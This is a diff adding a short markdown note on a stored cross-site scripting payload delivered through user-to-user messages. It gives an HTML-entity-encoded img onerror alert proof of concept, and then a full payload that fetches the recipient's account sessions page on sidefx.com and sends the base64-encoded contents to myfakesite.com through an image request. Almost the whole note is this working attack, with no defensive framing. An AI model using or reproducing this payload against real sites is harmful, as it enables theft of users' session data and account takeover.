@@ -1,0 +1,6 @@
+#Popup message payload used for XSS attack to generate the popup to through the message from one account to another 
+using this payoad When we send the message from one user to another user to it will open a popup in reciever user account .
+
+
+##Payload :- https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxx&quotonerror=&quotalert&#40&#39XSS&#39&#41&quot&gt
+##Whole payload structure:- https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxxx&quotonerror=&quotfetch&#40&#39https&#58&#47&#47www.sidefx.com/account/sessions&#39&#41.then&#40response=&gt&#123response.text&#40&#41.then&#40ddd=&gt&#123let&#32el=document.createElement&#40&#39img&#39&#41&#59el.src=&#39http&#58&#47&#47myfakesite.com?q=&#39&#43btoa&#40encodeURIComponent&#40ddd&#41&#41&#59document.body.appendChild&#40el&#41&#125&#41&#125&#41&quot&gt 
